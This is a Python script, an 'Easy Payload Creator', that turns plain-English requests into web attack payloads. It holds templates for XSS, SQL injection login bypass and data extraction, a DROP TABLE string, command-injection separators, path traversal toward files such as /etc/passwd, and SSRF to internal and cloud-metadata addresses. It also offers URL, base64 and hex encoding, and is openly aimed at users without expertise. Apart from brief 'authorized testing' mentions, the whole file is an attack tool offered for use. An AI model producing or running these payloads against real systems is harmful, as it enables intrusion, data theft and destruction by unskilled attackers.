#!/usr/bin/env python3
"""
Easy Payload Creator - No expertise needed!
Just describe what you want to test in plain English
"""

import json
import base64
import urllib.parse

class EasyPayloadCreator:
    """Create payloads from plain English descriptions"""
    
    def __init__(self):
        self.attack_patterns = {
            # XSS patterns
            'alert': {'type': 'xss', 'payloads': [
                '<script>alert("{msg}")</script>',
                '<img src=x onerror=alert("{msg}")>',
                '<svg/onload=alert("{msg}")>',
                '<input onfocus=alert("{msg}") autofocus>',
            ]},
            'popup': {'type': 'xss', 'payloads': [
                '<script>alert("{msg}")</script>',
                '<script>confirm("{msg}")</script>',
                '<script>prompt("{msg}")</script>',
            ]},
            'javascript': {'type': 'xss', 'payloads': [
                '<script>{msg}</script>',
                'javascript:{msg}',
                '<img src=x onerror={msg}>',
            ]},
            
            # SQLi patterns
            'database': {'type': 'sqli', 'payloads': [
                "' OR '1'='1' -- {msg}",
                "' UNION SELECT {msg}--",
                "1; DROP TABLE {msg}--",
            ]},
            'login bypass': {'type': 'sqli', 'payloads': [
                "admin' OR '1'='1",
                "admin'--",
                "' OR 1=1--",
            ]},
            'extract data': {'type': 'sqli', 'payloads': [
                "' UNION SELECT {msg} FROM users--",
                "' AND 1=0 UNION SELECT {msg}--",
            ]},
            
            # Command injection
            'run command': {'type': 'command', 'payloads': [
                '; {msg}',
                '| {msg}',
                '`{msg}`',
                '$({msg})',
            ]},
            'execute': {'type': 'command', 'payloads': [
                '; {msg}',
                '&& {msg}',
                '|| {msg}',
            ]},
            
            # Path traversal
            'read file': {'type': 'path', 'payloads': [
                '../../../{msg}',
                '..\\..\\..\\{msg}',
                '....//....//....///{msg}',
            ]},
            'access': {'type': 'path', 'payloads': [
                '../{msg}',
                '../../{msg}',
                '%2e%2e%2f{msg}',
            ]},
            
            # SSRF
            'internal': {'type': 'ssrf', 'payloads': [
                'http://localhost/{msg}',
                'http://127.0.0.1/{msg}',
                'http://169.254.169.254/{msg}',
            ]},
            'redirect': {'type': 'ssrf', 'payloads': [
                'http://{msg}',
                'https://{msg}',
                'file:///{msg}',
            ]},
        }
    
    def understand_intent(self, user_input):
        """Understand what the user wants to do"""
        user_input_lower = user_input.lower()
        
        # Check for keywords
        for keyword, config in self.attack_patterns.items():
            if keyword in user_input_lower:
                return config
        
        # Default patterns based on common words
        if any(word in user_input_lower for word in ['show', 'display', 'alert', 'popup', 'message']):
            return self.attack_patterns['alert']
        
        if any(word in user_input_lower for word in ['login', 'bypass', 'admin', 'password']):
            return self.attack_patterns['login bypass']
        
        if any(word in user_input_lower for word in ['command', 'execute', 'run', 'shell']):
            return self.attack_patterns['run command']
        
        if any(word in user_input_lower for word in ['file', 'read', 'access', 'passwd']):
            return self.attack_patterns['read file']
        
        if any(word in user_input_lower for word in ['database', 'sql', 'table', 'select']):
            return self.attack_patterns['database']
        
        # Default to XSS
        return self.attack_patterns['alert']
    
    def extract_message(self, user_input):
        """Extract the actual message/value from user input"""
        # Remove common instruction words
        words_to_remove = ['show', 'display', 'alert', 'popup', 'message', 'with', 'saying', 
                          'execute', 'run', 'command', 'read', 'file', 'access', 'bypass',
                          'login', 'as', 'admin', 'get', 'data', 'from', 'table', 'database']
        
        words = user_input.split()
        filtered = [w for w in words if w.lower() not in words_to_remove]
        
        if filtered:
            return ' '.join(filtered)
        
        return 'test'
    
    def create_payload(self, user_input):
        """Create payload from plain English input"""
        config = self.understand_intent(user_input)
        message = self.extract_message(user_input)
        
        payloads = []
        for template in config['payloads']:
            if '{msg}' in template:
                payload = template.format(msg=message)
            else:
                payload = template
            payloads.append(payload)
        
        return {
            'type': config['type'],
            'message': message,
            'payloads': payloads
        }
    
    def encode_payload(self, payload, encoding='url'):
        """Encode payload"""
        encodings = {
            'url': lambda p: urllib.parse.quote(p),
            'base64': lambda p: base64.b64encode(p.encode()).decode(),
            'hex': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
        }
        return encodings.get(encoding, lambda p: p)(payload)

def interactive_mode():
    """Super easy interactive mode"""
    creator = EasyPayloadCreator()
    
    print("=" * 70)
    print("🎯 EASY PAYLOAD CREATOR - No Expertise Needed!")
    print("=" * 70)
    print("\nJust tell me what you want to test in plain English!")
    print("I'll create the technical payload for you.\n")
    
    print("📚 Examples of what you can say:")
    print("  - 'Show an alert saying Hello'")
    print("  - 'Display a popup with XSS'")
    print("  - 'Bypass login as admin'")
    print("  - 'Read file /etc/passwd'")
    print("  - 'Execute command whoami'")
    print("  - 'Get data from users table'")
    print("  - 'Access internal localhost'")
    print()
    
    while True:
        print("=" * 70)
        user_input = input("💬 What do you want to test? (or 'quit' to exit): ").strip()
        
        if user_input.lower() in ['quit', 'exit', 'q']:
            print("\n👋 Goodbye! Happy (authorized) testing!")
            break
        
        if not user_input:
            continue
        
        # Create payload
        result = creator.create_payload(user_input)
        
        print(f"\n✅ I understood: You want to test {result['type'].upper()}")
        print(f"📝 Message/Value: {result['message']}")
        print(f"\n🎯 Here are your payloads:\n")
        
        for i, payload in enumerate(result['payloads'], 1):
            print(f"{i}. {payload}")
        
        # Ask if they want encoding
        print("\n🔧 Want to encode these? (url/base64/hex/none)")
        encoding = input("Encoding: ").strip().lower()
        
        if encoding in ['url', 'base64', 'hex']:
            print(f"\n🔐 Encoded payloads ({encoding}):\n")
            for i, payload in enumerate(result['payloads'], 1):
                encoded = creator.encode_payload(payload, encoding)
                print(f"{i}. {encoded}")
        
        print("\n" + "=" * 70)
        print("✨ Copy any payload above and use it in your authorized testing!")
        print("=" * 70 + "\n")

def quick_mode():
    """Quick one-liner mode"""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 easy_payload_creator.py 'your request in plain English'")
        print("Example: python3 easy_payload_creator.py 'show alert saying test'")
        return
    
    creator = EasyPayloadCreator()
    user_input = ' '.join(sys.argv[1:])
    
    result = creator.create_payload(user_input)
    
    print(f"Type: {result['type'].upper()}")
    print(f"Message: {result['message']}")
    print("\nPayloads:")
    for payload in result['payloads']:
        print(f"  {payload}")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        quick_mode()
    else:
        interactive_mode()
